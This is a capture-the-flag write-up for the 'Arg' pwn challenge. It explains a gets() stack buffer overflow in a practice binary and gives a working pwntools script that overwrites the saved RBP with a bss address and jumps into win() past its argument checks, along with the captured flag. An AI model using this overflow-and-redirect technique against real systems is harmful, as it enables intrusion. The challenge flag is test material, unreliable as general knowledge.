# Arg
---

### Challenge Description

Specific arguments... Seems easy

nc challenge2.lagncrash.com 10001

[Args.zip](https://github.com/caprinux/LagNCrash/files/6129814/Args.zip)

---

### Solution

So we are given the ELF binary and the source code. Checking the binary, we get:

```
$ pwn checksec argssource

[*] '/media/sf_Kali_Linux/argssource'

    Arch:     amd64-64-little

    RELRO:    Partial RELRO

    Stack:    No canary found

    NX:       NX enabled

    PIE:      No PIE (0x400000)

```

Opening the source code, we get: 

```C
#include <stdio.h>
#include <unistd.h>
int main(int argc, char** argv){
	setvbuf(stdout, NULL, _IONBF, 0);
	vuln();
}

int vuln(void){
	char buf[128];
	gets(buf);
	return 0;
}

int win(long a, long b, long c){
	if(!(a == 0xdeadbeef)) return 1;
	if(!(b == 0xcafebabecafebabe)) return 1;
	if(!(c == 0xd00df00dd00df00d)) return 1;

	char buf[64];
	FILE *f = fopen("flag.txt","r");
	if (f == NULL) {
	printf("Run this on the server.\n");
	exit(0);
	}

	fgets(buf,64,f);
	printf(buf);

	return 0;	
}
```

As you can see, from the checksec, this file does not have a canary unlike Baby, but NX is enabled. 

We go on to read the source code, we see that the executable goes from the main() to the vuln() and takes an input with the gets call, gets call does not limit the number of bytes you can input.

But buffer only holds 128 bytes of input, then it returns, this allows us to buffer overflow.

Furthermore, from the win function, we can see that flag.txt is being read from fopen, and then its copied into buf with fgets, and printed with printf.

Let's further analyse the binary in gdb-gef

We disassemble the win function to see the segments of the fgets fopen printf

```gdb

   0x00000000004007c8 <+87>:	mov    esi,0x4008b4

   0x00000000004007cd <+92>:	mov    edi,0x4008b6

   0x00000000004007d2 <+97>:	call   0x400610 <fopen@plt>

   0x00000000004007d7 <+102>:	mov    QWORD PTR [rbp-0x8],rax

```

As we can see from here, the file path is loaded into fopen, and the file is saved in rax, then rbp-0x8.

```

```gdb
   0x00000000004007f6 <+133>:	mov    rdx,QWORD PTR [rbp-0x8]

   0x00000000004007fa <+137>:	lea    rax,[rbp-0x50]

   0x00000000004007fe <+141>:	mov    esi,0x40

   0x0000000000400803 <+146>:	mov    rdi,rax

   0x0000000000400806 <+149>:	call   0x4005d0 <fgets@plt>

```

Basically, fgets will write the flag into an offset of RBP-0x50

```
   0x000000000040080b <+154>:	lea    rax,[rbp-0x50]

   0x000000000040080f <+158>:	mov    rdi,rax

   0x0000000000400812 <+161>:	mov    eax,0x0

   0x0000000000400817 <+166>:	call   0x4005b0 <printf@plt>

```

And printf will print whatever is in RBP-0x50 which is our flag.

Hence now we know we want to overwrite the previous RBP address to a writeable memory, such that when leave function is passed, our rbp will be our overwritten writeable memory.

However, where can we find writeable memory that we can set our rbp to? We can set our RBP to the uninitialized BSS segment of the memory, which is always writeable.

To obtain the address of the bss segment, we can run the following command

```
$ objdump -x argssource | grep bss
 24 .bss          00000010  0000000000601070  0000000000601070  00001070  2**4

0000000000601070 l    d  .bss	0000000000000000              .bss

0000000000601078 l     O .bss	0000000000000001              completed.6982

0000000000601070 g     O .bss	0000000000000008              stdout@@GLIBC_2.2.5

0000000000601080 g       .bss	0000000000000000              _end

0000000000601070 g       .bss	0000000000000000              __bss_start
```
Here, we get some address of bss functions, but I wasn't sure whether to write to the start or the end. Hence, I trial and error with both __bss_start and _end .

Opening the argssource file with Ghidra, we go to the win function and we can see the address. We skip all the parameter checks and copy the address of the win function right before flag.txt is opened.

win_addr_before_fopen = 0x00000000004007c8

Now that we have everything, we can craft our exploit.

```py
from pwn import *

win_addr_before_fread = 0x00000000004007c8
vuln_offset = 128
bss_segment = 0x0000000000601080

payload = b"A" * vuln_offset + p64(bss_segment) + p64(win_addr_before_fread)
p = remote('challenge2.lagncrash.com', 10001)
p.sendline(payload)
print(p.recv())
```

We obtain the flag.

```
LNC{C5U_H4V3_7H3_GADGETS}
```

_p.s. this was probably not the intended way of solving args but welp_

